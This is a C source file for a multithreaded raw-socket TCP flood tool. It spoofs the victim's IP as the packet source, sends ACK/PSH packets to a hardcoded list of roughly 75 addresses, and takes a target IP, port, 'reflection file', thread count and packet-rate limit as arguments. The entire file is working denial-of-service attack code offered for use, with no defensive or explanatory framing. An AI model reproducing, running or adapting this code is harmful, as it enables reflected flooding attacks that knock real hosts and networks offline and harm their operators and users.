// fatti was here

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data
{
    int thread_id;
    int dport;
    struct list *list_node;
    struct sockaddr_in sin;
};
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i] ^ Q[i] ^ PHI ^ i;
    }
}
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}
unsigned int cwr = 1;
static const char PAYLOAD[] = "\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x5C\x72\x5C\x6E\x48\x6F\x73\x74\x3A\x20\x77\x77\x77\x2E\x79\x6F\x75\x70\x6F\x72\x6E\x2E\x63\x6F\x6D";
static const char PAYLOAD2[] = "\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x5C\x72\x5C\x6E\x48\x6F\x73\x74\x3A\x20\x77\x77\x77\x2E\x72\x6F\x78\x79\x70\x6C\x61\x63\x65\x2E\x63\x6F\x6D\x5C\x72\x5C\x6E\x5C\x72\x5C\x6E";
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
static unsigned int PAYLOADSIZE2 = sizeof(PAYLOAD2) - 1;

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int PAYLOADSIZE)
{
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + PAYLOADSIZE + PAYLOADSIZE2);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + PAYLOADSIZE + PAYLOADSIZE2;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + PAYLOADSIZE + PAYLOADSIZE2);
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

struct tcpopts {
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;
        uint8_t tstamp;
        uint8_t tslen;
        uint8_t tsno;
        uint8_t tsval;
        uint8_t tsclock;
        uint8_t tsclockval;
        uint8_t tssendval;
        uint8_t tsecho;
        uint8_t tsecho2;
        uint8_t tsecho3;
        uint8_t tsecho4;
};


void setup_tcpopts_header(struct tcpopts *opts)
{
    opts->nop_nouse = 0x01;
    opts->nop_nouse2 = 0x01;
    opts->nop_nouse3 = 0x01;
    opts->msskind = 0x02;
    opts->mssvalue = htons(1460);
    opts->msslen = 0x04;
    opts->wskind = 0x03;
    opts->wslen = 0x03;
    opts->wsshiftcount = 0x07;
    opts->sackkind = 0x04;
    opts->sacklen = 0x02;
    opts->tstamp = 0x08;
    opts->tslen = 0x0a;
    opts->tsno = randnum(1, 250);
    opts->tsval = 0xd8;
    opts->tsclock = 0xd9;
    opts->tsclockval = 0x68;
    opts->tssendval = 0xa3;
    opts->tsecho = 0x00;
    opts ->tsecho2 = 0x00;
    opts->tsecho3 = 0x00;
    opts->tsecho4 = 0x00;
}
int proto[2] = {6, 17};
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = IPTOS_ECN_NOT_ECT;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr)  + PAYLOADSIZE + PAYLOADSIZE2;
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = 255;
    iph->protocol = 6;
    iph->check = 0;
   // iph->saddr = inet_addr("192.168.3.100");
}


int ports[3] = {80, 443, 22};
void setup_tcp_header(struct tcphdr *tcph)
{
    //tcph->source = htons(ports[randnum(0, 3)]);
    tcph->check = 0;
    memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, PAYLOADSIZE); // tcp options
    memcpy((void *)tcph + sizeof(struct tcphdr) + PAYLOADSIZE, PAYLOAD2, PAYLOADSIZE2);
    tcph->ack = 1;
    //tcph->rst = 1;
    //tcph->ack = 1;
    tcph->psh = 1;
    //tcph->cwr = 1;
    tcph->ack_seq = randnum(10000,99999);
    tcph->urg_ptr = 1;
    tcph->window = htons(64240); 
    tcph->doff = ((sizeof(struct tcphdr)) + PAYLOADSIZE  + PAYLOADSIZE2) / 4;
}
void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
 int class[]= {1760222384
,1760222381
,1760222373
,1760222440
,1760222382
,1760222424
,1760222425
,1760222436
,1760222444
,1760222452
,1760222370
,1760222378
,1760222450
,1760222459
,1760222423
,1760222456
,1760222375
,1760222374
,1760222372
,1760222442
,1760222462
,1760222377
,1760222421
,1760222443
,1760222376
,1760222435
,1760222379
,1760222457
,1760222371
,1760222274
,1760222448
,1760222441
,1760222385
,1760222451
,1760222380
,1760222438
,1760222439
,1760222434
,1760222383
,1760222455
,1760222382
,1760222372
,1760222381
,1760222435
,1760222385
,1760222377
,1760222380
,1760222375
,1760222379
,1760222371
,1760222439
,1760222461
,1760222378
,1760222441
,1760222370
,1760222427
,1760222374
,1760222386
,1760222450
,1760222451
,1760222452
,1760222436
,1760222376
,1760222281
,1760222425
,1760222384
,1760222373
,1760222424
,1760222440
,1760222419
,1760222420
,1760222457
,1760222383
,1760222438
,1760222455
,1760222421



};
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr); // including our specified tcp options in the datagram.
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);
    setup_tcpopts_header(opts);
    tcph->dest = htons(ports[randnum(0, 3)]);
    iph->saddr = sin.sin_addr.s_addr;
    sin.sin_port = htons(floodport);
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while (1)
    {
        tcph->check = 0;
        tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
        tcph->doff = ((sizeof(struct tcphdr)) + PAYLOADSIZE  + PAYLOADSIZE2) / 4;
        tcph->dest = htons(ports[randnum(0, 3)]);
        iph->ttl = 255;
        //iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        list_node = list_node->next;
        iph->daddr = htonl(class[rand_cmwc()%50]);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
        tcph->source = htons(rand_cmwc() & 0xFFFF);
         //tcph->source = htons(td->dport);
        tcph->dest = htons(22); 
        tcph->check = tcpcsum(iph, tcph, PAYLOADSIZE);
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
       
        tcph->window = rand();
        pps++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }
    srand(time(NULL));
    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up sockets...\n");
    int floodport = atoi(argv[2]);
    int max_len = 512;
    char *buffer = (char *)malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = 0;
    pps = 0;
    int multiplier = 100;
    FILE *list_fd = fopen(argv[3], "r");
    while (fgets(buffer, max_len, list_fd) != NULL)
    {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
            (buffer[strlen(buffer) - 1] == '\r'))
        {
            buffer[strlen(buffer) - 1] = 0x00;
            if (head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr = inet_addr(buffer);
                head->next = head;
                head->prev = head;
            }
            else
            {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr = inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        }
        else
        {
            continue;
        }
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for (i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].dport = floodport;
        td[i].list_node = current;
        pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
    }
    fprintf(stdout, "Starting flood...\n");
    for (i = 0; i < (atoi(argv[6]) * multiplier); i++)
    {
        usleep((1024 / multiplier) * 1024);
        if ((pps * multiplier) > maxpps)
        {
            if (1 > limiter)
            {
                sleeptime += 100;
            }
            else
            {
                limiter--;
            }
        }
        else
        {
            limiter++;
            if (sleeptime > 25)
            {
                sleeptime -= 25;
            }
            else
            {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    return 0;
}
